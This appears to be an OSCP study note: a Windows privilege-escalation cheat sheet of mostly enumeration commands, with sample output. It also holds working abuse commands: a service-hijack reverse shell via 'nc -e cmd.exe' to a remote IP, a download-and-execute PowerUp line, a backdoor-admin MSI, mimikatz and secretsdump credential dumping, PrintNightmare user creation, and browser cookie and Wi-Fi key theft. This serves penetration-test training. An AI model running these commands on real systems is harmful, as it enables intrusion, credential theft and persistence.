---
tags:
  - 🔧
  - oscp
aliases: 
templateVersion: 0.3
Created: 2024-02-21
---

___
> [!info] What this does
>  

Hostname `hostname`
PC Description `Get-WmiObject -Class Win32_OperatingSystem | select Description`

## PrivEsc Relevant

##### Users
```powershell
Get-LocalUser
```
Alternative: `net user`
```powershell
Get-LocalGroup
```
Alternative: `net localgroup`
Of interest: Non-standard groups, _Administrators_, _Backup Operators_ (Universal file access), _Remote Desktop Users_ (RDP), and _Remote Management Users_ (WinRM)
```powershell
Get-LocalGroupMember Administrators
```
	
Alternative: `net localgroup Administrators`

Interesting Groups: [_Dns Admins_](https://adsecurity.org/?p=4064), [_Hyper-V Administrators_](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), _Print Operators_, _Server Operators_

Logged-in Users: `query user`
```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM
```
Alternative: `echo %USERNAME%`

Password Policy: `net accounts`

##### Privileges:
```powershell
whoami /all
```
```powershell
reg query "HKU\S-1-5-19"
```
_SeImpersonatePrivilege_ or _SeAssignPrimaryToken_ -> Named Pipes [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) or Juicy/Rotten/Sweet Potato
Also of interest: _SeBackupPrivilege_, _SeLoadDriver_, _SeTakeOwnershipPrivilege_, and _SeDebug_
If a priv is listed but set to enabled, it is assigned to the user but must be activated first. There is not a single way to activate privileges. The command or action required depends on the priv. Some of them are in [here](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1), SeBackupPrivilege just requires two commands.
[Full Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)
Example for administrative, non-vulnerable account:
	```
	Group Name                                                    Type             SID          Attributes
	============================================================= ================ ============ ==================================================
	Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
	BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
	BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
	LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
	Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
	``` https://learn.microsoft.com/de-de/windows-server/identity/ad-ds/manage/understand-special-identities-groups

Description of built-in users and groups: https://ss64.com/nt/syntax-security_groups.html

##### With access to local or network service account
https://github.com/itm4n/FullPowers

##### Bypass UAC
http://pwnwiki.io/#!privesc/windows/uac.md

##### Working Dir for attack
```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
	
##### SysInfo
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
(See: https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)

##### Systemwide patches
```powershell
wmic qfe get Caption"," Description"," HotFixID"," InstalledOn
```
Alternative: `Get-HotFix | ft -AutoSize`
	
##### Interesting user files
```PS
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred, *.kdbx, *password* -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

Search for file names using wildcards
```shell
dir /s *pass* == *cred* == *vnc* == *.config*
```
Alternative: `where /R C:\ *.config`

```PS
Get-ChildItem -Recurse -Include "*.xml", "*.ini", "*.txt", "*.cfg", "*.config", "*.yaml", "*.json", "*.log", "*.ps1", "*.bat", "*.cmd" -ErrorAction SilentlyContinue | sls -a '\b(pass(word)?|pwd|secret|api[_-]?key|token)\b\s*[:=]\s*["''"]?[^"''\s]{6,}' -ErrorAction SilentlyContinue |%{ "{0}`n - {1}:{2}" -f $_.Matches.Value,$_.Path,$_.LineNumber }
```
Alternative: findstr /si password *.xml *.ini *.txt *.cfg *.config *.json *.yaml *.log*


Chrome Custom Dictionaries
```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'
```

Sticky Notes: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

More interesting paths:
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\\*
C:\Program Files\Windows PowerShell\\*
```


##### Network Shares
```
net share
```

##### Running processes
```powershell
tasklist /SVC
```
	
(Alternative: `Get-Process`)
Standard processes:
	AggregatorHost
	CompatTelRunner
	conhost
	csrss
	ctfmon
	CWAUpdaterService -> Citrix Workspace App
	CtxsDPS -> Citrix Device Posture Service
	dllhost
	dwm
	fnms-docker-monitor -> Flexera FlexNet Manager Suite
	fontdrvhost
	frxccds -> Microsoft FSLogix
	LogonUI
	LsaIso -> Credential and Key Guard
	lsass
	Memory Compression
	MicrosoftEdgeUpdate
	msdtc
	MsMpEng
	ndinit
	RDMonitoringAgentLauncher -> Associated with Azure Virtual Desktops
	rdpclip
	RuntimeBroker
	SearchHost
	SearchIndexer
	SecurityHealthSystray/-Service
	services
	SgrmBroker
	ShellExperienceHost
	sihost
	smss
	spoolsv -> Fax and Printing
	StartMenuExperienceHost
	svchost
	taskhostw
	tasklist
	vm3dservice
	vmtoolsd
	wininit
	winlogon
	WmiApSrv
	WmiPrvSE
	WUDFHost
	ZSAService -> ZScaler Client Connector,
##### Environmet Variables
`set` and `Get-ChildItem Env: | ft Key,Value`

##### Installed programs
```powershell
wmic product get name"," version"," vendor
```
	
 Alternatives: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` (32-bit) and `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`. Also, check the _Program Files_ directories as this list might be incomplete
Pipe to `ft DisplayName,DisplayVersion,Publisher,InstallSource` to make it easier to read
##### Services
```powershell
wmic service get name","displayname","pathname","startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"
```
Alternatives: `Get-Service` or
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName | Where-Object {$_.State -like 'Running'}
```

Check if non-default services have files with lax write-permissions (W or F):
```powershell
icacls $file
```
Alternative: `Get-ACL`

Check if any of the pathnames are **unquoted** but contain spaces. e.g. with: `wmic service get name,pathname |findstr /i "auto" |  findstr /i /v "C:\Windows\\" | findstr /i /v """` or `gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name`

```powershell
accesschk.exe -accepteula -wuqvc "Everyone" *
```
Sysinternals. Also try with  `"Users"` and `"Authenticated Users"`
Look for GENERIC_WRITE, GENERIC_ALL, or SERVICE_CHANGE_CONFIG to abuse. Look for WRITE_DAC or WRITE_OWNER to allow SERVICE_CHANGE_CONFIG
Alternative: `.\SharpUp.exe audit` from the [GhostPack suite](https://github.com/GhostPack/SharpUp/)

Abuse with `sc config <vulnerableService> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"; sc config <vulnerableService> obj= ".\LocalSystem" password= ""; net start <vulnerableService>`)
Alternative: `sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"; sc stop WindscribeService; sc start WindscribeService`

Alternative: `accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`
Abuse with: `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`

##### Listeners/Connections
```powershell
netstat -ano
```
Loopback listeners might be insecure. Notably: 25672 (Erlang)

##### Named Pipes
```PS
gci \\.\pipe\
```
```
    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper
```

Or with SysinternalsSuite:
```PS
pipelist.exe /accepteula
```
```
Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc                                            4               -1
ROUTER                                            3               -1
vmware-authdpipe                                  1                1
```

##### Review Pipe Permissions
For all pipes:
```PS
accesschk.exe /accepteula \pipe\
```

All pipes that we can write to:
```PS
accesschk.exe -w \pipe\* -v
```

```PS
accesschk.exe /accepteula \\.\Pipe\lsass -v
```
```
\\.\Pipe\lsass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW NT AUTHORITY\ANONYMOUS LOGON
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW APPLICATION PACKAGE AUTHORITY\Your Windows credentials
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```


##### Scheduled tasks
> Always run as SYSTEM under Win2000, XP, and 2003
```powershell
schtasks /query /fo CSV /v | ConvertFrom-Csv | where { $_.Status -ne "Disabled" -and $_."Run As User" -like "SYSTEM" -and $_.TaskPath -notlike "\Microsoft*" }
```
Alternative: `schtasks /query /fo LIST /v`, `Get-ScheduledTask`, `dir C:\windows\tasks`, `dir C:\Windows\System32\Tasks`
```
TaskName                                                State
--------                                                -----
.NET Framework NGEN v4.0.30319                          Ready
.NET Framework NGEN v4.0.30319 64                       Ready
.NET Framework NGEN v4.0.30319 64 Critical           Disabled
.NET Framework NGEN v4.0.30319 Critical              Disabled
AD RMS Rights Policy Template Management (Automated) Disabled
AD RMS Rights Policy Template Management (Manual)       Ready
PolicyConverter                                      Disabled
SmartScreenSpecific                                     Ready
VerifiedPublisherCertStoreCheck                      Disabled
Microsoft Compatibility Appraiser                       Ready
ProgramDataUpdater                                      Ready
StartupAppTask                                          Ready
appuriverifierdaily                                     Ready
appuriverifierinstall                                   Ready
CleanupTemporaryState                                   Ready
DsSvcCleanup                                            Ready
Pre-staged app cleanup                               Disabled
```

Missing binaries?
```powershell
autorunsc64.exe -a t | more
```
(Part of SysInternals - Look for "File Not Found". Also try with `-a s`)

##### Startup
```
wmic startup get caption,command
```
Alternative: `Get-CimInstance Win32_StartupCommand`
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```
Details about autorun locations: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html, https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2

##### History
```powershell
Get-History; (Get-PSReadlineOption).HistorySavePath
```
Default: `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.` (Starting with Powershell 5.0 in Windows 10)

All history files readable by our current user:
```PS
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

##### LOLBAS
https://lolbas-project.github.io/#

##### PowerUp.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

### Registry misconfigurations
PS Alternative to `reg query` -> `Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOF...'`
##### Can .msi's run privileged without UAC?
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
(-> `msiexec /quiet /qn /i c:\path\to\file.msi`)
##### Always install elevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Abuse with `msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi` (or `-f msi-nouac`) and then `msiexec /quiet /qn /i C:\evil.msi`
##### Passwords set by GPOs
Look into `\\hostname\SYSVOL` to find Groups.xml. The AES-Key the password is encrypted with is known. Also look into cPassword attributes in `Services\Services.xml`, `ScheduledTasks\ScheduledTasks.xml`, `Printers\Printers.xml`, `Drives\Drives.xml`, `DataSources\DataSources.xml`. Automation: Powersploit `Get-GPPPassword`. Also:
```powershell
reg query HKLM /f password /t REG_SZ /s; reg query HKCU /f password /t REG_SZ /s
```
##### Creds for User Autologon?
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

##### Credential Manager
```
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Abuse with runas: `runas /savecred /user:Administrator "cmd.exe /k whoami"`

##### Creds stored in Chrome
[SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome
`.\SharpChrome.exe logins /unprotect` or `Invoke-SharpChromium -Command "cookies slack.com"`

##### Cookies stored in Firefox
`cat $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite`
using [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)
`python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d`

##### Creds stored by Putty
```PS
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

##### Mails
If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper)

##### Weak file/folder permissions
folder
```
accesschk.exe -uwdqs Users c:\; accesschk.exe -uwdqs "Authenticated Users" c:\
```
files
```
accesschk.exe -uwqs Users c:\*.*; accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

##### Can we access any of these files?
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

##### Secretsdump.py
Copy the SYSTEM, SAM, and SECURITY hives from _C:\Windows\System32\Config_ to kali and execute [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) with `secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL` to extract local users

##### Passwords (mimikatz)
```powershell
privilege::debug
```

```powershell
token::elevate
```

```powershell
lsadump::sam
```
(lsadump::lsa /patch ??)
```powershell
vault::cred /patch
```
##### Drivers	
```powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object "Display Name", "Start Mode", "Path"
```
https://www.loldrivers.io/
##### WSL
`wsl whoami`. If wsl is installed, try to change the distros default user, e.g., `./ubuntun1604.exe config --default-user root`. Then exploit with `wsl <reverseshell>`. WSL Filesystem can be found under `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` See [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#hivenightmare)
### From local Admin to NT SYSTEM
`PsExec.exe -i -s cmd.exe`
##### Shadow Copies
```powershell
vssadmin list shadows #Needs local Admin
```
Alternative: `diskshadow list shadows all`
```powershell
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Then access this symlink

### Protections

##### UAC
Check if UAC is enabled
```PS
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

Check Level:
```PS
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
_0x5_ is the highest level "Always Notify"

[List of UAC Bypasses](https://github.com/hfiref0x/UACME)
[Authentication Credentials Uac And Efs - HackTricks](https://book.hacktricks.wiki/en/windows-hardening/authentication-credentials-uac-and-efs.html)


##### List AV-Products
```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

##### Windows Defender
```PS
Get-MpComputerStatus
```
```
AMEngineVersion                 : 1.1.17900.7
AMProductVersion                : 4.10.14393.2248
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.2248
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM
AntispywareSignatureVersion     : 1.333.1470.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM
AntivirusSignatureVersion       : 1.333.1470.0
BehaviorMonitorEnabled          : False
ComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :
```

##### AppLocker
```PS
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
```
PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
Name                : (Default Rule) All scripts
Description         : Allows members of the local Administrators group to run all scripts.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow
```

Test specific Executable
```PS
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### Specific Exploits
##### Potatoes
Hot Potato is patched in MS16-075
Juicy (> Lonely > Rotten) Potato for machines < Windows 10 1809 & Windows Server 2019
For higher versions: Rogue Potato
But: **Sweet Potato can do it all**
Except when the print service is not running. Then try Generic Potato
##### HiveNightmare
CVE-2021–36934, Win 10/11, see [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#hivenightmare)
Check: `icacls C:\Windows\System32\config\SAM` (Must include `BUILTIN\Users:(I)(RX)` to be vulnerable)
Abuse (mimikatz): `token::whoami /full` -> `misc::shadowcopies` ->
```mimikatz
lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```
##### PrinterNightmare
CVE-2021-1675/CVE-2021-34527 (see [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare))
Check: `ls \\localhost\pipe\spoolss` (Should NOT say "path does not exist")
Abuse: Transfer `/home/kali/Documents/exploits/Windows/CVE-2021-1675.ps1` to victom -> `Set-ExecutionPolicy Bypass -Scope Process` -> "A" -> `Import-Module .\CVE-2021-1675.ps1` -> `Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"`
##### Concealed Position
[CVE-2021-34481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34481)
`/home/kali/Documents/exploits/Windows/ConcealedPosition/`
https://github.com/jacob-baines/concealed_position
## Loot for later
##### Home folder
```powershell
dir /B /S /A-D
```

```powershell
Get-ChildItem -Recurse -Path C:\Users\offsec | select Parent,Name
```
	
##### Network interfaces
```powershell
ipconfig /all
```
Alternative: `Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address; Get-DnsClientServerAddress -AddressFamily IPv4 | ft`
##### Firewall settings
```powershell
netsh advfirewall show currentprofile, netsh advfirewall firewall show rule name=all
```
##### Gateways
```powershell
route print
```
Alternative: `Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex`
##### ARP-Cache
```
arp -a
```
Alternative: `Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State`
##### Hosts File
`C:\WINDOWS\System32\drivers\etc\hosts`
##### WLAN passwords
```powershell
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

##### Powershell Version
```bash
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```
##### Mounted Volumes
```powershell
mountvol
```
##### Devices
```powershell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
```
##### SNMP
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```
Alternative: `Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse`
##### Softwareverteilung?
```powershell
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

##### Event Logs
If we are Administrator or part of the corresponding group (`net localgroup "Event Log Readers"`), we can query events using the wevtutil utility and the Get-WinEvent cmdlet.

For example, query for passwords in logs: `wevtutil qe Security /rd:true /f:text | Select-String "/user"`
Alternative: `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`
Notes:
- Both commands can be run as different users (_/u_ and _/p_ or _-Credential_)
- The Get-WinEvent also requires adjustment of the reg key _HKLM\System\CurrentControlSet\Services\Eventlog\Security_ if user is part of the Event Log Group

## Breakout from Remote Access Solutions
Basic Methodology for break-out:

1. Gain access to a File Explorer Dialog Box
Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box

2. Exploit the Dialog Box to achieve command execution

If is it forbidden to traverse the file tree, make sure that "All Files" is selected in the field next to the file name and enter the UNC path to a file directly, e.g., `\\127.0.0.1\c$\users\pmorgan`. 

Otherwise, host a PE compiled from the following C code via SMB and access the share by entering the UNC path, e.g., _\\10.13.38.95\share_ into the path field. Then rightclick the PE and select Execute.
```C
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

